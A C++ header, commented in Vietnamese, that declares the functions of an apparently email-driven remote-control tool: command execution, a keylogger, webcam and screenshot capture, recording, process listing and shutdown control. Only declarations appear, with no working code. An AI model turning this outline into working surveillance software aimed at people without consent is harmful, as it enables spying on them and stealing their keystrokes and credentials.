#pragma once
#include "lib.h"
#include "listProgram.h"
#include "config.h"
#include "shutdownProgram.h"
#include "sendPicture.h"
#include "sendScreenshot.h"
#include "keylogger.h"
#include "recording.h"

// Các hàm execute cơ bản (không gửi email)
void execute_command(const string& command);

// Thực thi các command cần tạo file output
void execute_command_with_file(const string& command, const string& outputFile);

// Helper function để parse thời gian keylogger
int parse_keylogger_duration(const string& command);

// Các hàm handle riêng lẻ
void handle_start_program(const std::string& command);
void handle_shutdown_program(const std::string& command);
void handle_get_picture(const std::string& outFile);
void handle_get_screenshot(const std::string& outFile);
void handle_list_programs(const std::string& outFile);   // Running programs
void handle_list_processes(const std::string& outFile);  // Processes with PID
void handle_list_installed(const std::string& outFile);  // Installed programs
void handle_keylogger(const std::string& command, const std::string& outFile);
void handle_shutdown();
void handle_restart();
void handle_cancel_shutdown();
void handle_stop_recording();
void handle_start_recording(const std::string& outFile);